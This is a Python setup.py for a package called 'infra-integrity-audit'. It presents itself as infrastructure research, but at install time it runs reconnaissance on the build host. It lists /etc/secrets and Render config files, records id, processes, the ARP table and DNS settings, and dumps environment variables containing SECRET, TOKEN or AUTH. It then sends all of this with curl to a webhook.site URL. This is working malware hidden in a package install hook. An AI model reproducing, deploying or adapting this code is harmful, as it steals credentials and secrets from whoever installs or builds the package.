from setuptools import setup
import os, subprocess, json, socket

WEBHOOK_URL = "https://webhook.site/cfea9f28-475a-4cb1-b192-8b1f26d719f5"

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=7).decode('utf-8', errors='ignore').strip()
    except:
        return "N/A"

 
def get_infra_type():
    if os.environ.get('NETLIFY'): return "NETLIFY-PROD-BUILDER"
    if os.environ.get('VERCEL'): return "VERCEL-INFRA"
    if os.environ.get('RAILWAY_PROJECT_ID'): return "RAILWAY-CLOUD"
    
    if "cloudchamber" in socket.gethostname(): return "CLOUDFLARE-CLOUDCHAMBER"
    return f"HOST-{socket.gethostname()}"

def render_specific_recon():
    recon = {}
 
    recon["etc_secrets_list"] = run_cmd("ls -laR /etc/secrets 2>/dev/null")
    
   
    context_root = os.environ.get('RENDER_SERVICE_CONTEXT_ROOT', 'N/A')
    recon["context_root_perms"] = run_cmd(f"ls -ld {context_root}")
    
    
    pm_root = os.environ.get('RENDER_PM_ROOT', '/home/render')
    recon["pm_root_files"] = run_cmd(f"ls -la {pm_root}/*.json 2>/dev/null")
    
    return recon

infra_name = get_infra_type()

report_data = {
    "VULNERABILITY_RESEARCH": "RENDER-ISOLATION-TEST-V2",
    "INFRA_TARGET": infra_name,
    "RENDER_SPECIFIC": render_specific_recon(),
    "SYSTEM_INFO": {
        "USER": run_cmd("id"),
        "PROCESSES": run_cmd("ps auxww | head -n 20")
    },
    "NETWORK_RECON": {
        "ARP": run_cmd("cat /proc/net/arp"),
        "K8S_SERVICE_HOST": os.environ.get('KUBERNETES_SERVICE_HOST', 'N/A'),
        "DNS_SEARCH_DOMAIN": run_cmd("grep 'search' /etc/resolv.conf")
    },
    "ENVIRONMENT_DUMP": {k: v for k, v in os.environ.items() if any(x in k for x in ["RENDER", "SECRET", "TOKEN", "AUTH"])}
}

# Вывод
pretty_json = json.dumps(report_data, indent=4)
print(f"\n--- REPORT FOR {infra_name} ---")
print(pretty_json)

# Отправка на вебхук
try:
    subprocess.run([
        'curl', '-X', 'POST', 
        '-H', 'Content-Type: application/json', 
        '-d', pretty_json, 
        f"{WEBHOOK_URL}?infra={infra_name}"
    ], timeout=10)
except:
    pass

setup(
    name="infra-integrity-audit",
    version="2.2.0",
    description="Researching Render & Cloudflare Infrastructure",
)
